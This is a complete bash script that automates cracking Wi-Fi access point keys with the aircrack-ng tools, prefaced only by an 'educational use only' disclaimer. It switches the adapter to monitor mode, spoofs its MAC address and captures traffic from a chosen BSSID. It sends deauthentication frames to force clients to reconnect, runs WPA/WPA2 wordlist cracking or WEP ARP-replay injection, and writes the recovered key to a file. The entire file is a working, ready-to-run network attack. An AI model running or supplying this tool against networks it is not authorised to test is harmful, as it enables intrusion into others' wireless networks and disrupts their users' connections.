#!/bin/bash
#LEGAL NOTICE
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if [ "$(id -u)" != "0" ]; then
	echo "This script must be run as root." 2>&1
	exit 1
fi

command -v aircrack-ng > /dev/null 2>&1 || { echo >&2 "Error aircrack-ng is required. To install, as root run \"apt-get install aircrack-ng\"."; exit 2; }
clear
trap 'service network-manager start' exit
RED=`(tput setaf 1)`
RESET=`(tput sgr 0)`
BID="[0-9,A-F][0-9,A-F]\:[0-9,A-F][0-9,A-F]\:[0-9,A-F][0-9,A-F]\:[0-9,A-F][0-9,A-F]\:[0-9,A-F][0-9,A-F]\:[0-9,A-F][0-9,A-F]"
while :; do
airmon-ng
echo "Select interface to use (EX: wlan0), followed by [ENTER] key:"
read INT
if [[ $INT != wlan[0-9] || -z $INT ]]; then 
	echo "${RED}Invalid interface.${RESET}"
	read; clear
else break
fi
done

rfkill unblock all 
airmon-ng check kill
OUTPUT=`airmon-ng start $INT | grep -oe 'mon0'`

if [ -z $OUTPUT ];then
	MON='mon'
	NEW_INT=$INT$MON
else
	NEW_INT='mon0'
fi

ifconfig $NEW_INT down
macchanger -r $NEW_INT
ifconfig $NEW_INT up

clear
echo "airodump-ng will now start. Once desired access point is found press CTRL+C keys to continue."; echo ""
read -p "Press [ENTER] key to continue:"
airodump-ng $NEW_INT

while :; do
echo ""; echo ""; echo "Enter as follows: [Channel/CH] [BSSID] (EX: 11 62:0B:23:8F:12:AD), followed by [ENTER] key:"
shopt -s nocasematch; read CHANNEL RBSSID
if [[ $CHANNEL -le 14 && $CHANNEL -ge 1 && $RBSSID =~ $BID ]]; then
	xterm -hold -e airodump-ng -c $CHANNEL --bssid $RBSSID -w $HOME/Desktop/OUTPUT --ignore-negative-one $NEW_INT &
	shopt -u nocasematch; break
else 	echo ""; echo "${RED}Invalid channel or bssid.${RESET}"
fi
done

while :; do
echo ""; echo "Select type of encryption that AP uses:"; echo "[1] WPA/WPA2"; echo "[2] WEP"
read ENC
case $ENC in
	"1")	clear #WPA/WPA2
		while :; do
			echo ""; echo "Deauthenticate client, y/n?"
			shopt -s nocasematch; read AGAIN
			if [[ $AGAIN = y || $AGAIN = yes ]]; then 
				xterm -e aireplay-ng -0 2 -a $RBSSID $NEW_INT
			elif [[ $AGAIN = n || $AGAIN = no ]]; then
				shopt -u nocasematch; break
			else	
				echo "${RED}Invalid input.${RESET}"
			fi
		done

		clear
		while :; do
			echo ""; echo "Enter wordlist location (EX: /var/share/wordlists/rockyou.txt), followed by [ENTER] key. To locate wordlist use \"-l\" (EX: -l rockyou.txt)."
			read LOC WDLT
			echo ""; updatedb
			if [[ $LOC = -l  && $WDLT = ?* ]]; then 
				locate $WDLT | less
			elif [[ -n $LOC && -z $WDLT && $LOC != -l ]]; then
				aircrack-ng -w $LOC $HOME/Desktop/OUTPUT*.cap -l $HOME/Desktop/$RBSSID-WPA-KEY.txt
				echo ""
			else	echo ""; echo "${RED}Invalid input.${RESET}"
			fi
		done;;

	"2")	clear #WEP
		while :; do
			echo "Enter the station/client mac address (EX: 62:0B:23:8F:12:AD), followed by the [ENTER] key."; echo "To copy text, highlight text, and paste with mouse scroll key (middle button)."
			shopt -s nocasematch; read SMAC
			if [[ $SMAC =~ $BID ]]; then
				xterm -hold -e aireplay-ng -3 -b $RBSSID -h $SMAC $NEW_INT &
				shopt -u nocasematch; break
			else 	echo ""; echo "${RED}Invalid bssid.${RESET}"; echo ""
			fi	
		done
		while :; do
			echo ""; echo "Deauthenticate client, y/n?"
			shopt -s nocasematch; read AGAIN
			if [[ $AGAIN = y || $AGAIN = yes ]]; then 
				xterm -e aireplay-ng -0 2 -a $RBSSID -c $SMAC $NEW_INT 
			elif [[ $AGAIN = n || $AGAIN = no ]]; then
				shopt -u nocasematch
				aircrack-ng $HOME/Desktop/OUTPUT*.cap -l $HOME/Desktop/$RBSSID-WEP-KEY.txt
				echo ""
			else	
				echo "${RED}Invalid input.${RESET}"
			fi
		done;;

	*)	echo ""; echo "${RED}Invalid option.${RESET}"; echo "";;
esac
done
